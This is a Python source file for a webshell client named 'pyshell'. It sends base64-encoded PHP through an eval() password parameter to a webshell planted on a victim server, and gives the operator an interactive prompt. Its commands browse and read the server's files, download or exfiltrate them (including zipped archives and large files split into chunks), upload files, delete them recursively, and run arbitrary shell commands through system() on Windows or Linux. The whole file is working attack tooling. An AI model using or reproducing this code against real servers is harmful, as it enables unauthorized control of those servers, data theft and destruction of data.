import os
import re
import sys
import time
import atexit
import base64
import readline
import requests
import subprocess
from alive_progress import alive_bar

def save_history(historyPath):
    readline.write_history_file(historyPath)#保存历史命令文件
def exit_handler():
    global historyPath
    save_history(historyPath)
    print(bcolors.ENDC)
atexit.register(exit_handler)#退出时调用
class Spider:
    global shellpass
    @staticmethod
    def post(url, code):
        header = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',          
        }
        base64code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
        postdata = {shellpass:"@eval(base64_decode($_POST[x]));","x":base64code}
        req = requests.post(url, data = postdata, headers=header)
        return req.content
    @staticmethod
    def post2(url, code):
        header = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',          
        }
        base64code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
        postdata = {shellpass:"@eval(base64_decode($_POST[x]));","x":base64code}
        req = requests.post(url, data = postdata, headers=header,stream=True)
        return req
class bcolors:#终端文本颜色设置
    OKBLUE = '\033[1;94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[5;94m'
    FAIL = '\033[91m'
    BLUE = '\033[1;36m'
    ENDC = '\033[0;36m'
    BOLD = '\033[1m'
    RED = '\033[1;31m'
    RED1 = '\033[0;31m'
def showrwx(num):
    permx = {'1':'--x', '2':'-w-', '4':'r--', '7':'rwx'}
    if num in permx.keys():
        return permx[num]
    elif num == "3" :
        return "-wx"
    elif num == "5":
        return "r-x"
    elif num == "6":
        return "rw-"
    else:
        return "rwx"
def ShowRule(list):
    string = "\nMode\t\tLastWriteTime\t\tLength \tName\n"
    string += "----\t\t-------------------\t------\t----\n"
    for line in list:
        string += "{0}".format(showrwx(line[3][1]) + showrwx(line[3][2]) + showrwx(line[3][3]))
        string += "\t{0}".format(line[1])
        string += "\t{0}".format(line[2])
        string += "\t{0}\n".format(line[0])
    print(string)
def filesave(data, name):
    with open(name, 'ab') as file:
        file.write(data)
def Execute():
    global url
    global current_path
    string = '''
    {}                             _          _ _ 
                                | |        | | |  \033[0;35mV0.57b\033[0m
    {}             _ __  _   _ ___| |__   ___| | |
      {}          | '_ \| | | / __| '_ \ / _ \ | |
                | |_) | |_| \__ \ | | |  __/ | |
                | .__/ \__, |___/_| |_|\___|_|_|
                | |     __/ |                   
                |_|    |___/                 \033[1;36mBy\033[0m \033[1;34mBlueArc\033[0m       
                
                  \033[0;36mNothing to say,just do it!\033[0m
    '''.format(bcolors.RED,bcolors.RED,bcolors.RED)
    print(string)    
    time.sleep(0.5) #查看webshellpath
    code = '''  
    echo dirname(__FILE__);
    '''.strip()
    html = Spider.post(url, code)
    code = '''
    function php_self(){
    $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);
    return $php_self;
    }
    $phpself=php_self();
    echo $phpself;
    '''
    Webshellname = Spider.post(url,code).decode('utf-8') #查看webshell
    sitepath =  (html.decode('utf-8')).replace('\\\\', '\\')
    print("\033[1;32mWEBSHELLPATH Detected:\033[0m \033[0;32m%s\033[0m     " % sitepath,end="")
    print("\033[1;36mWEBSHELL Detected:\033[0m \033[1;34m%s\033[0m" % Webshellname) 
    time.sleep(0.8)
    current_path = sitepath

    if os.name == "nt":
        print("\033[0;31mAttack Platform:\033[0m \033[1;31mWindows NT\033[0m    ",end="")
    else:
        print("\033[0;31mAttack Platform:\033[0m \033[1;31mLinux\033[0m     ",end="")
    code = '''
    echo php_uname('s');
    '''
    osname = Spider.post(url,code).decode('utf-8')
    print("\033[0;31mVictm Platform:\033[0m \033[1;31m%s\n\033[0m"% osname)
    if osname == 'Windows NT':
        ossep = '\\'
    else:
        ossep = '/'
    time.sleep(1.5)
    while True:
        try:
            inputstr = input('{}┌──({}root💀kali{})-[{}{}{}]\n{}└─{}#{} '.format(
                bcolors.BLUE,
                bcolors.RED,
                bcolors.BLUE,
                bcolors.OKBLUE,
                current_path,
                bcolors.BLUE,
                bcolors.BLUE,
                bcolors.RED,
                bcolors.ENDC)) #读取命令
        except EOFError:
            exit_handler()
            break
        orderlist = inputstr.split(' ') #parts列表存储命令
        if len(orderlist) == 1:
            orderlist.append(' ')
        if orderlist[0] == 'exit':
            break
        if orderlist[0] == 'help':
            print("  "+ "-"*60)
            print("   [1]    ", "ls".ljust(15, " "), "Show files")
            print("   [2]    ", "cd".ljust(15, " "), "Change path")
            print("   [3]    ", "cat".ljust(15, " "), "Check file")
            print("   [4]    ", "get".ljust(15, " "), "Get small file")
            print("   [5]    ", "rm".ljust(15, " "), "Remove file")
            print("   [6]    ", "upload".ljust(15, " "), "Upload file")
            print("   [7]    ", "rename".ljust(15, " "), "Rename file")
            print("   [8]    ", "zip".ljust(15, " "), "Zip file(windows)")
            print("   [9]    ", "xz".ljust(15, " "), "Xz file(linux)")
            print("   [10]   ", "download".ljust(15, " "), "Get BigFile(linux)")
            print("   [10]   ", "shell".ljust(15, " "), "Execute os command")
            print("  "+ "-"*60)
            continue
        if orderlist[0] == 'ls':
            filelist = re.compile(r'file:([\s\S]+?)\stime:([\s\S]+?)\ssize:(\d+?)\sperm:(\d{4})')
            code = '''
                    echo("-|");
                    $D=%s;
                    $F=@opendir($D);
                    if($F==NULL){
                        echo("ERROR:// Path Not Found Or No Permission!");
                        }
                    else{
                        $M=NULL;
                        $L=NULL;
                        while($N=@readdir($F)){
                            $P=$D."/".$N;
                            $T="time:".@date("Y-m-d H:i:s",@filemtime($P));
                            @$E="perm:".substr(base_convert(@fileperms($P),10,8),-4);
                            $R=" ".$T." size:".@filesize($P)." ".$E."";
                            if(@is_dir($P)){
                                $M.="file:".$N."/".$R;
                                }
                            else {
                                $L.="file:".$N.$R;
                                }
                            }
                        echo $M.$L;
                        @closedir($F);
                        }
                    echo("|<-");
                    die();  
                    ''' % "'{0}'".format(current_path).strip()  #发送的php代码
            result = Spider.post(url, code) #发送爬虫指令
            if result == b'-|ERROR:// Path Not Found Or No Permission!|<-':
                print ("Error: Path Not Found Or No Permission!")
            else:
                ShowRule(filelist.findall(result.decode('utf-8')))
            continue
        if orderlist[0] == 'cd':         
            tmp_path = current_path + ossep + orderlist[1]
            code = '''
                    echo("-|");
                    $D='{0}';
                    $F=@opendir($D);
                    if($F==NULL){{
                        echo("ERROR:// Path Not Found Or No Permission!");
                        }}
                    else{{
                        echo("SUCCESS:// File Found!");
                    }}
                    echo("|<-");
                    die();  
                    ''' .format(tmp_path)  #发送的php代码
            result = Spider.post(url, code) 
            if result == b'-|ERROR:// Path Not Found Or No Permission!|<-':
                print ("Error: Path Not Found !\n")
            else:
                code = '''
                $imgPath = "{0}";
                $absolutePath = realpath($imgPath);
                echo $absolutePath;
                '''.format(current_path + ossep + orderlist[1]) 
                current_path = Spider.post(url,code).decode('utf-8').replace('\\\\',ossep)
            continue
        if orderlist[0] == 'cat':
            code = '''
            $file_path = '{0}';
            if(file_exists($file_path)){{
                $fp = fopen($file_path,"r");
                $str = fread($fp,filesize($file_path));//指定读取大小，这里把整个文件内容读取出来
                echo $str = str_replace("\r\n","<br />",$str);
                fclose($fp);
            }}
            else{{
                echo(">|0|<");
            }}
            ''' .format(current_path + ossep + orderlist[1])
            res = Spider.post(url,code)
            if (res == b'>|0|<'):
                print("File Not Found Or No Permission!")
            else:
                print(res.decode('utf-8'))
            continue
        if orderlist[0] == 'get':
            code = '''
                    $D=%s;
                    $F=@is_file($D);
                    if($F==NULL){
                        echo("-|ERROR:// File Not Found Or No Permission!|<-");
                        }
                    else{
                        $P=@fopen($D,"rb");
                        echo(@fread($P,filesize($D)));
                        @fclose($P);
                        die();
                    }
                   '''% "'{0}'".format(current_path + ossep + orderlist[1]).strip()
            filedata = Spider.post(url, code)
            if filedata == b'-|ERROR:// File Not Found Or No Permission!|<-':
                print ("File Not Found Or No Permission!\n")
            else:
                filesave(filedata, orderlist[1])
                print("Download File SUCCESS!\n")
            continue
        if orderlist[0] == 'rm':
            code = '''
            echo("-|");
            function deldir($dir) {
                $dh=opendir($dir);
                while ($file=readdir($dh)) {
                    if($file!="." && $file!="..") {
                        $fullpath=$dir."/".$file;
                        if(!is_dir($fullpath)) {
                            @chmod($fullpath,0777);
                            unlink($fullpath);
                        } 
                        else {@chmod($fullpath,0777);deldir($fullpath);}
                    }
                }
                closedir($dh);
                @chmod($dir,0777);
                if(rmdir($dir)){
                    return true;
                }
                else{
                    return false;
                }
            }
            $F=%s;
            if(is_dir($F))echo(deldir($F));
            else{
                @chmod($F,0777);
                echo(file_exists($F)?@unlink($F)?"1":"0":"0");
                }
            echo("|<-");
            die();
            '''% "'{0}'".format(current_path + ossep + orderlist[1]).strip()
            if b"-|1|<-" == Spider.post(url, code):
                print("Delete File Success!\n")
            else:
                print("File Not Found Or No Permission!\n")
            continue
        if orderlist[0] == 'upload':
            command = "ls -l {0} >/dev/null 2>&1".format(orderlist[1])
            if os.system(command) != 0:
                print ("Your File not Found!\n")
                continue 
            localfile = orderlist[1]
            with open(localfile, 'rb') as file:
                data = file.read()                
            filestream = ""
            for line in range(len(data)):
                filestream += "%02x" % data[line]
            code = '''
                echo("-|");;
                $fi='{0}';
                $c='{1}';
                $c=str_replace("\\r","",$c);
                $c=str_replace("\\n","",$c);
                $buf="";
                for($i=0;$i<strlen($c);$i+=2)
                    $buf.=urldecode("%".substr($c,$i,2));                    
                echo(@fwrite(fopen($fi,"w"),$buf)?"1":"0");;
                echo("|<-");
                die();
                '''.format(current_path + ossep + orderlist[1],filestream).strip()
            #注意 远程和本地都需要指定到文件名
            if b"-|1|<-" == Spider.post(url, code):
                print("Upload File Success!\n")
            else:
                print("File Not Found Or No Permission!\n")
            continue
        if orderlist[0] == 'rename':
            if orderlist[1] == " ":
                print("File Not Found Or No Permission!\n")
                continue
            oldname = current_path + ossep + orderlist[1]
            newname = current_path + ossep + orderlist[2]
            code = '''
            echo("-|");
            $m=get_magic_quotes_gpc();
            $src='{0}';
            $dst='{1}';
            echo(rename($src,$dst)?"1":"0");
            echo("|<-");
            die();
            ''' .format(oldname, newname)
            if b'-|1|<-' == Spider.post(url, code):
                print("Rename file ok\n")
            else:
                print("File Not Found Or No Permission!\n")
            continue   
        if orderlist[0] == 'zip':
            if orderlist[1] == " ":
                print("File Not Found Or No Permission!\n")
                continue
            code = '''
            function addFileToZip($path,$zip){
                $handler = opendir($path); 
                while(($filename = readdir($handler))!==false){
                    if($filename != "." && $filename != ".."){
                        if(is_dir($path."/".$filename)){
                            addFileToZip($path."/".$filename, $zip);
                        }else{ 
                            $zip->addFile($path."/".$filename);
                        }
                    }
                }
                @closedir($path);
            }
            echo("->|");
            $zip = new ZipArchive();
            if($zip->open('File.zip', ZipArchive::CREATE)=== TRUE){
                $path = %s;
                if(is_dir($path)){  
                    addFileToZip($path, $zip);
                }
                else{      
                    if($zip->addFile($path))echo("0");
                    else{
                        echo("1");
                    };
                }
                $zip->close();
            echo("|<-"); 
            }
            else{echo("Fail!");}
            echo("|<-");
            '''% "'{0}'".format(current_path + ossep + orderlist[1]).strip()    
            Spider.post(url, code)
            
            code = '''
                    $D=%s;
                    $F=@is_file($D);
                    if($F==NULL){
                        echo("-|ERROR:// File Not Found Or No Permission!|<-");
                        }
                    else{
                        $P=@fopen($D,"r");
                        echo(@fread($P,filesize($D)));
                        @fclose($P);
                        die();
                    }
                   '''% "'{0}'".format(sitepath + ossep + 'File.zip').strip()
            filedata = Spider.post(url, code)
            
            code = '''
            echo("-|");
            function deldir($dir) {
                $dh=opendir($dir);
                while ($file=readdir($dh)) {
                    if($file!="." && $file!="..") {
                        $fullpath=$dir."/".$file;
                        if(!is_dir($fullpath)) {
                            @chmod($pf,0777);
                            unlink($fullpath);
                        } 
                        else {@chmod($pf,0777);deldir($fullpath);}
                    }
                }
                closedir($dh);
                @chmod($pf,0777);
                if(rmdir($dir)){
                    return true;
                }
                else{
                    return false;
                }
            }
            $F=%s;
            if(is_dir($F))echo(deldir($F));
            else{
                echo(file_exists($F)?@unlink($F)?"1":"0":"0");
                }
            echo("|<-");
            die();
            '''% "'{0}'".format(sitepath + ossep + 'File.zip').strip()
            Spider.post(url,code)
            
            if filedata == b'-|ERROR:// File Not Found Or No Permission!|<-':
                print ("File Not Found Or No Permission!\n")
            else:
                filesave(filedata, 'File.zip')
                print("Download File SUCCESS!\n")
            continue
        if orderlist[0] == 'xz':
            if orderlist[1] == " ":
                print("File Not Found Or No Permission!\n")
                continue
            code = '''
            system('tar cf tmp.tar {0}',$callback);
            system('tar Jcf File.tar.xz tmp.tar',$callback);
            echo($callback);
            '''.format(current_path + ossep + orderlist[1])
            Spider.post(url,code)
            code = '''
            $D='{a}';
            $F=@is_file($D);
            if($F==NULL){{
                echo("-|ERROR:// File Not Found Or No Permission!|<-");
                }}
            else{{
                $P=@fopen($D,"r");
                echo(@fread($P,filesize($D)));
                @fclose($P);
                die();
            }}
            ''' .format(a = sitepath + ossep + 'File.tar.xz').strip()
            filedata = Spider.post(url, code)

            code = '''
            $F=%s;
            if(is_dir($F))echo(deldir($F));
            else{
                @chmod($F,0777);
                echo(file_exists($F)?@unlink($F)?"1":"0":"0");
                }
            echo("|<-");
            die();
            '''% "'{0}'".format(sitepath + ossep + 'tmp.tar').strip()
            Spider.post(url,code)

            code = '''
            $F=%s;
            if(is_dir($F))echo(deldir($F));
            else{
                @chmod($F,0777);
                echo(file_exists($F)?@unlink($F)?"1":"0":"0");
                }
            echo("|<-");
            die();
            '''% "'{0}'".format(sitepath + ossep + 'File.tar.xz').strip()
            Spider.post(url,code)

            if filedata == b'-|ERROR:// File Not Found Or No Permission!|<-':
                print ("File Not Found Or No Permission!\n")
            else:
                filesave(filedata, 'File.tar.xz')
                print("Download File SUCCESS!\n")
            continue
        if orderlist[0] == 'download':
            print("Please Wait.....")
            code = '''
            system("split -b 10M -a 3 --numeric-suffixes=0 --additional-suffix=mine {a} BS",$callback);
            '''.format(a = current_path + ossep + orderlist[1])
            Spider.post(url,code)
            code = '''
            system('find -type f -name "BS*" |wc -l',$callback);
            '''
            num = int(Spider.post(url,code).decode('utf-8'))
            items = range(num)
            print("-------------------Have a GOOD LUCK!-------------------")
            with alive_bar(len(items),title="Downloading", bar="bubbles", spinner="pulse") as bar:
                for item in items:
                    bar()
                    if item<10:
                        item = '00'+str(item)
                    elif 10<=item and item<100:
                        item ='0'+str(item)
                    else:
                        item=str(item)
                    code = '''
                        $D=%s;
                        $F=@is_file($D);
                        if($F==NULL){
                            echo("-|ERROR:// File Not Found Or No Permission!|<-");
                            }
                        else{
                            $P=@fopen($D,"r");
                            echo(@fread($P,filesize($D)));
                            @fclose($P);
                            die();
                        }
                    ''' % "'{0}'".format(sitepath + ossep + 'BS'+ item +'mine').strip()
                    filedata = Spider.post(url, code)
                    filesave(filedata, 'BS'+ item +'mine')
            code = '''
            system("rm -f BS***mine",$callback);
            '''
            Spider.post(url,code)
            os.system("cat BS???mine > {0}".format(orderlist[1]))
            print("Please Wait.....")
            print("Download Big File SUCCESS!")
            os.system("rm -f BS***mine")
            continue
        if orderlist[0] == 'shell':
            if osname == "Windows NT":
                code = '''
                @system("cmd /c cd {0} & {1}  ",$callback);
                '''.format(current_path,inputstr[5:])
                print(Spider.post(url,code).decode("utf8","ignore"))
            else:
                code = '''
                @system("bash -c 'cd {0} 2>&1 && {1} 2>&1' ",$callback);
                '''.format(current_path,inputstr[5:])
                print(Spider.post(url,code).decode("utf8","ignore"))
            continue
        if orderlist[0] == 'dl':
            print("Please Wait.....")
            code = '''
            $fsize = @filesize('{0}');
            echo $fsize;
            '''.format(current_path + ossep + orderlist[1])
            filesize = int(Spider.post(url,code).decode('utf-8'))
            code = '''
            @set_time_limit(0);
            function readfile_chunked($filename, $retbytes = TRUE){{
                $file = fopen($filename, "rb" );
                while (!feof($file)) {{
                    $chunk_size = 1024 * 1024 *10; 
                    $buffer = @fread($file, $chunk_size);
                    echo $buffer;
                    ob_flush();
                    flush();
                }}       
                fclose($file);
            }}
            readfile_chunked('{0}');
            '''.format(current_path + ossep + orderlist[1])
            chunk_size = 1024*1024*10
            req = Spider.post2(url,code)
            print("-------------------Have a GOOD LUCK!-------------------")
            with open(orderlist[1], 'wb') as f:
                with alive_bar(filesize,title="Downloading", bar="bubbles", spinner="pulse") as bar:
                        for chunk in req.iter_content(chunk_size=chunk_size):
                            if chunk:
                                bar(len(chunk))
                                f.write(chunk)
            f.close()
            print("Download Big file SCUCESS!\n")
            continue
        if orderlist[0] == 'dl2':
            cmd = ['python' ,'download.py',url,shellpass,current_path,orderlist[1],ossep]
            subprocess.Popen(cmd)
        else:
            print("Command Not Found!\n")

if __name__ == '__main__':
    if len(sys.argv) != 3: #使用格式说明
        print('\nUsage: python3 {} URL SHELLPASS\n'.format(sys.argv[0]))
        print('For example:\npython3 {} {} {}\n'.format(sys.argv[0], 'http://192.168.13.107/blue.php','shell'))
        exit(0)
    else:
        url = sys.argv[1] 
        shellpass = sys.argv[2]
    historyPath = os.path.expanduser("~/.pyshellhistory")#存放在/home/用户名/下
    if os.path.exists(historyPath):
        readline.read_history_file(historyPath)#读取历史命令文件
    Execute()

def save_history(historyPath):
    readline.write_history_file(historyPath)#保存历史命令文件
def exit_handler():
    global historyPath
    save_history(historyPath)
    print(bcolors.ENDC)
atexit.register(exit_handler)#退出时调用
